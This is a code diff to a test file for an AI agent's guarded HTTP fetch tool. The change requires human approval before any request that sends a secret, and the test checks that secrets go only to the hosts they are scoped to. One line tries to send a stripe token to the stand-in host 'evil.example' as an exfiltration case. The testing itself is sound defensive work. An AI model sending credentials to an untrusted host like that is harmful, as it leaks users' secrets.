@@ -2,7 +2,7 @@ import { mkdtempSync, rmSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { createServer, type IncomingHttpHeaders, type Server } from "node:http";
-import { afterEach, beforeEach, describe, expect, it } from "vitest";
+import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
 
 import { ToolRegistry } from "../agent/registry.js";
 import { GuardedTools } from "../kernel/guarded.js";
@@ -90,12 +90,21 @@ describe("http.fetch module", () => {
     };
     const secrets = new SecretsRegistry({ openai: "sk-real", stripe: "sk-stripe" }, { openai: { hosts: ["api.example.com"] }, stripe: { hosts: ["api.stripe.com"] } });
     const registry = await load({ allowedHosts: ["api.example.com", "api.stripe.com", "evil.example"], fetchImpl }, secrets);
-    const tools = new GuardedTools({ registry, secrets, audit: new AuditLog(ws.db), approvals: new ApprovalQueue(ws.db) });
+    const approvals = new ApprovalQueue(ws.db);
+    const tools = new GuardedTools({ registry, secrets, audit: new AuditLog(ws.db), approvals });
+    // Every call that sends a secret asks, even to a host on the list: said yes to here.
+    const approved = async (input: Record<string, unknown>): Promise<void> => {
+      const call = tools.execute("http.fetch", input);
+      await vi.waitFor(() => expect(approvals.pending()).toHaveLength(1));
+      expect(approvals.pending()[0]!.reason).toMatch(/^sends secret \w+ to api\.(example|stripe)\.com$/);
+      approvals.approve(approvals.pending()[0]!.id, "owner");
+      await call;
+    };
 
-    await tools.execute("http.fetch", { url: "https://api.example.com/?key={{secret:openai}}", headers: { authorization: "Bearer {{secret:openai}}" } });
+    await approved({ url: "https://api.example.com/?key={{secret:openai}}", headers: { authorization: "Bearer {{secret:openai}}" } });
     expect(sent.pop()).toMatchObject({ url: "https://api.example.com/?key=sk-real", headers: { authorization: "Bearer sk-real" } });
 
-    await tools.execute("http.fetch", { url: "https://api.stripe.com/v1", headers: { authorization: "Bearer {{secret:stripe}}" } });
+    await approved({ url: "https://api.stripe.com/v1", headers: { authorization: "Bearer {{secret:stripe}}" } });
     expect(sent.pop()).toMatchObject({ headers: { authorization: "Bearer sk-stripe" } });
 
     const elsewhere = await tools.execute("http.fetch", { url: "https://evil.example/", headers: { authorization: "Bearer {{secret:stripe}}" } });
